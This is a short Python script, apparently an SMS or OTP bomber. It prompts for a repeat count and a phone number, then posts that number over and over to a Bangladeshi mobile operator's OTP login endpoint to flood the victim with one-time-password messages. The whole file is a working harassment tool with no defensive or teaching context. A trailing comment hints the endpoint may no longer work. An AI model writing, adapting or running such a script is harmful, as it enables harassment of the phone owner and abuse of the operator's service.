import requests

mygpip="https://weblogin.grameenphone.com/backend/api/v1/otp"


valu= int(input("Enter Your Value : "))

phn = str(input("Enter Your Number : "))

nmr={'msisdn':phn}
for i in range(valu):
	requests.post(mygpip,data=nmr)
	
	#you cannot use this using api
	
	
	